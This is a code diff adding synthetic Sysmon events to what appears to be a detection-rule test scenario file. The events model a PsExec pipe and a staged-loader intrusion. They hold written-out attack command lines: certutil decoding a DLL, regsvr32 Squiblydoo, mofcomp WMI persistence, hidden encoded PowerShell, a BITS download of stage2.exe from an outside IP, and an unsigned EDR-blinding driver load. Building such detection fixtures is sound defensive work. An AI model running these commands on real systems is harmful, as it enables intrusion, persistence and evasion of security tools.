@@ -239,6 +239,17 @@ def scenarios() -> list[dict]:
             ParentProcessId="668",
             Hashes="SHA256=3337e3875b05e0bfba69ab926532e3f179e8cfbf162ebb60ce58a0281437a7ef",
         ),
+        # the named pipe PSEXESVC opens to relay the operator's session --
+        # fires alongside the service binary itself, same ProcessGuid, so
+        # both land in the same incident.
+        event(
+            17,
+            301,
+            host,
+            ProcessGuid=svc,
+            PipeName=r"\PSEXESVC",
+            User="CORP\\svc_backup",
+        ),
         event(
             1,
             304,
@@ -451,6 +462,110 @@ def scenarios() -> list[dict]:
             IntegrityLevel="High",
             ProcessId="5760",
             ParentProcessId="5600",
+        ),
+    ]
+
+    # ------------------------------------------------------------------ #
+    # Story 9 — OPS-WS-21: staged loader, WMI persistence, BYOVD.
+    # A "SystemUpdate.exe" loader decodes a smuggled DLL, executes it via a
+    # Squiblydoo scriptlet, stages WMI persistence (mofcomp, then the
+    # consumer registration itself), fetches a second stage over BITS, and
+    # finally loads an unsigned driver to blind EDR -- the six rules added
+    # alongside PsExec (Story 5 above). The WMI consumer (EventID 20) and the
+    # driver load (EventID 6) carry no ProcessGuid in real Sysmon telemetry,
+    # so -- correctly -- they surface as their own single-detection
+    # incidents rather than joining this tree; that is what an analyst would
+    # actually see, not a seeding gap.
+    # ------------------------------------------------------------------ #
+    host = "OPS-WS-21"
+    loader, cmd2 = "{ops-loader}", "{ops-cmd}"
+    events += [
+        event(
+            1,
+            550,
+            host,
+            Image=r"C:\Users\ops\Downloads\SystemUpdate.exe",
+            ProcessGuid=loader,
+            ParentProcessGuid="{ops-explorer}",
+            CommandLine=r"SystemUpdate.exe",
+            User="CORP\\ops",
+        ),
+        event(
+            1,
+            554,
+            host,
+            Image=r"C:\Windows\System32\cmd.exe",
+            ParentImage=r"C:\Users\ops\Downloads\SystemUpdate.exe",
+            ProcessGuid=cmd2,
+            ParentProcessGuid=loader,
+            CommandLine=r"cmd.exe /c setup.bat",
+        ),
+        # SYS-075: certutil decodes a base64-smuggled DLL back to binary.
+        event(
+            1,
+            558,
+            host,
+            Image=r"C:\Windows\System32\certutil.exe",
+            ParentImage=r"C:\Windows\System32\cmd.exe",
+            ProcessGuid="{ops-certutil}",
+            ParentProcessGuid=cmd2,
+            CommandLine=r"certutil.exe -decode C:\Users\ops\AppData\Local\Temp\payload.b64 "
+            r"C:\Users\ops\AppData\Local\Temp\payload.dll",
+        ),
+        # SYS-074: Squiblydoo -- scrobj.dll runs the decoded scriptlet, no URL
+        # in the command line, so SYS-003's `/i:http` check stays quiet.
+        event(
+            1,
+            562,
+            host,
+            Image=r"C:\Windows\System32\regsvr32.exe",
+            ParentImage=r"C:\Windows\System32\cmd.exe",
+            ProcessGuid="{ops-regsvr}",
+            ParentProcessGuid=cmd2,
+            CommandLine=r"regsvr32.exe /s /u /i:C:\Users\ops\AppData\Local\Temp\payload.sct scrobj.dll",
+        ),
+        # SYS-070: mofcomp stages the WMI subscription from the command line.
+        event(
+            1,
+            566,
+            host,
+            Image=r"C:\Windows\System32\wbem\mofcomp.exe",
+            ParentImage=r"C:\Windows\System32\cmd.exe",
+            ProcessGuid="{ops-mofcomp}",
+            ParentProcessGuid=cmd2,
+            CommandLine=r"mofcomp.exe C:\Users\ops\AppData\Local\Temp\persist.mof",
+        ),
+        # SYS-071: the subscription itself lands as a WmiEventConsumer.
+        event(
+            20,
+            570,
+            host,
+            Name="SystemUpdateWatcher",
+            Type="CommandLineEventConsumer",
+            Destination=r"powershell.exe -w hidden -enc "
+            r"U3RhcnQtUHJvY2VzcyBDOlxVc2Vyc1xvcHNcc3RhZ2UyLmV4ZQ==",
+        ),
+        # SYS-076: second stage fetched via the BITS cmdlet, not bitsadmin.
+        event(
+            1,
+            574,
+            host,
+            Image=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+            ParentImage=r"C:\Windows\System32\cmd.exe",
+            ProcessGuid="{ops-bits}",
+            ParentProcessGuid=cmd2,
+            CommandLine=r"Start-BitsTransfer -Source http://185.220.101.42/stage2.exe "
+            r"-Destination C:\Users\ops\AppData\Local\Temp\stage2.exe",
+        ),
+        # SYS-077: an unsigned driver loads, the BYOVD step that blinds EDR
+        # right before the second stage would run.
+        event(
+            6,
+            578,
+            host,
+            ImageLoaded=r"C:\Windows\Temp\rtcore64.sys",
+            Signed="false",
+            Hashes="SHA256=a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f9",
         ),
     ]
 
